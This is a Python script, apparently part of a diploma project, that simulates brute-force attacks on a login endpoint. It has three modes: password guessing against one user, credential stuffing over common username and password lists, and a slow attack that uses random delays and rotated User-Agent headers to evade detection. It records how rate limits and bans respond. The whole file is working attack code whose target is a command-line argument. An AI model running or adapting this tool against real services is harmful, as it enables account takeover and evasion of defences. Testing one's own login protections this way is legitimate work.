"""
Brute Force Attack Simulator — for diploma demonstration.

Simulates different brute force patterns:
1. Simple — try many passwords for one username
2. Credential Stuffing — try many username:password pairs
3. Slow & Low — stay just under detection thresholds

Usage:
    python attacks/bruteforce_simulator.py --mode simple --target http://localhost:8000/api/login
    python attacks/bruteforce_simulator.py --mode stuffing --target http://localhost:8000/api/login
    python attacks/bruteforce_simulator.py --mode slow --target http://localhost:8000/api/login
"""

import asyncio
import time
import random
import argparse
from dataclasses import dataclass, field

import httpx


COMMON_PASSWORDS = [
    "123456", "password", "12345678", "qwerty", "abc123",
    "monkey", "1234567", "letmein", "trustno1", "dragon",
    "baseball", "iloveyou", "master", "sunshine", "ashley",
    "michael", "shadow", "123123", "654321", "superman",
    "admin123", "admin", "root", "test", "test123",
    "pass123", "welcome", "login", "password1", "p@ssw0rd",
]

COMMON_USERNAMES = [
    "admin", "root", "test", "user", "administrator",
    "info", "support", "webmaster", "contact", "office",
    "sales", "service", "marketing", "dev", "demo",
    "john", "jane", "bob", "alice", "manager",
]


@dataclass
class BFStats:
    total_attempts: int = 0
    successful: int = 0
    blocked: int = 0
    failed: int = 0
    lockouts: int = 0
    start_time: float = 0

    def report(self):
        elapsed = time.time() - self.start_time
        print(f"\n{'='*60}")
        print(f"  Brute Force Simulation Report")
        print(f"{'='*60}")
        print(f"  Duration:        {elapsed:.1f}s")
        print(f"  Total Attempts:  {self.total_attempts}")
        print(f"  Successful:      {self.successful}")
        print(f"  Failed (401):    {self.failed}")
        print(f"  Blocked (429):   {self.blocked}")
        print(f"  Lockouts Hit:    {self.lockouts}")
        print(f"  Block Rate:      {self.blocked / self.total_attempts * 100:.1f}%" if self.total_attempts else "  Block Rate:      N/A")
        print(f"{'='*60}\n")


async def simple_bruteforce(target: str, username: str = "admin"):
    """Try many passwords against a single username."""
    print(f"[*] Simple Brute Force: targeting user '{username}'")
    stats = BFStats(start_time=time.time())

    async with httpx.AsyncClient(timeout=10) as client:
        for password in COMMON_PASSWORDS:
            stats.total_attempts += 1
            try:
                r = await client.post(target, json={
                    "username": username,
                    "password": password,
                })
                if r.status_code == 200:
                    data = r.json()
                    if data.get("success"):
                        stats.successful += 1
                        print(f"  ✅ FOUND: {username}:{password}")
                    else:
                        stats.failed += 1
                        print(f"  ❌ Failed: {username}:{password}")
                elif r.status_code == 429:
                    stats.blocked += 1
                    data = r.json()
                    lockout = data.get("lockout_remaining", 0)
                    if lockout:
                        stats.lockouts += 1
                        print(f"  🔒 LOCKED OUT for {lockout}s — waiting...")
                        await asyncio.sleep(min(lockout + 1, 10))  # Wait but cap for demo
                    else:
                        print(f"  ⛔ Rate limited")
                        await asyncio.sleep(1)
                elif r.status_code == 403:
                    stats.blocked += 1
                    print(f"  🚫 BANNED by shield")
                    break
            except Exception as e:
                print(f"  ⚠️ Error: {e}")
                stats.total_attempts -= 1

            await asyncio.sleep(0.3)  # Slight delay between attempts

    stats.report()


async def credential_stuffing(target: str):
    """Try many different username:password combos (leaked credentials style)."""
    print(f"[*] Credential Stuffing Attack")
    stats = BFStats(start_time=time.time())

    pairs = [(u, p) for u in COMMON_USERNAMES[:10] for p in COMMON_PASSWORDS[:5]]
    random.shuffle(pairs)

    async with httpx.AsyncClient(timeout=10) as client:
        for username, password in pairs:
            stats.total_attempts += 1
            try:
                r = await client.post(target, json={
                    "username": username,
                    "password": password,
                })
                if r.status_code == 200:
                    data = r.json()
                    if data.get("success"):
                        stats.successful += 1
                        print(f"  ✅ FOUND: {username}:{password}")
                    else:
                        stats.failed += 1
                elif r.status_code == 429:
                    stats.blocked += 1
                    data = r.json()
                    lockout = data.get("lockout_remaining")
                    if lockout:
                        stats.lockouts += 1
                        print(f"  🔒 Locked out for {lockout}s")
                        await asyncio.sleep(min(lockout + 1, 5))
                elif r.status_code == 403:
                    stats.blocked += 1
                    print(f"  🚫 BANNED")
                    break
            except Exception:
                pass

            await asyncio.sleep(0.2)

    stats.report()


async def slow_and_low(target: str, username: str = "admin"):
    """
    Slow & Low attack — tries to stay under detection thresholds.
    Makes attempts at irregular intervals to mimic human behavior.
    """
    print(f"[*] Slow & Low Attack: targeting '{username}' with random delays")
    stats = BFStats(start_time=time.time())

    async with httpx.AsyncClient(timeout=10) as client:
        for password in COMMON_PASSWORDS:
            stats.total_attempts += 1

            # Random delay to mimic human (3-15 seconds)
            delay = random.uniform(3, 15)
            print(f"  ⏱️  Waiting {delay:.1f}s before next attempt...")
            await asyncio.sleep(delay)

            try:
                # Rotate User-Agent to look more human
                ua = random.choice([
                    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
                    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/605.1",
                    "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
                ])
                r = await client.post(target, json={
                    "username": username,
                    "password": password,
                }, headers={
                    "User-Agent": ua,
                    "Accept-Language": "en-US,en;q=0.9",
                    "Accept-Encoding": "gzip, deflate, br",
                })

                if r.status_code == 200:
                    data = r.json()
                    if data.get("success"):
                        stats.successful += 1
                        print(f"  ✅ FOUND: {username}:{password}")
                    else:
                        stats.failed += 1
                        print(f"  ❌ {username}:{password}")
                elif r.status_code == 429:
                    stats.blocked += 1
                    print(f"  ⛔ Detected even with slow approach!")
                elif r.status_code == 403:
                    stats.blocked += 1
                    print(f"  🚫 BANNED")
                    break
            except Exception as e:
                print(f"  ⚠️ {e}")

    stats.report()


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Brute Force Attack Simulator")
    parser.add_argument("--mode", choices=["simple", "stuffing", "slow"],
                        default="simple", help="Attack mode")
    parser.add_argument("--target", default="http://localhost:8000/api/login",
                        help="Login endpoint URL")
    parser.add_argument("--username", default="admin", help="Target username")
    args = parser.parse_args()

    print(f"\n🔑 Starting Brute Force Simulation: mode={args.mode}")
    print(f"   Target: {args.target}\n")

    if args.mode == "simple":
        asyncio.run(simple_bruteforce(args.target, args.username))
    elif args.mode == "stuffing":
        asyncio.run(credential_stuffing(args.target))
    elif args.mode == "slow":
        asyncio.run(slow_and_low(args.target, args.username))
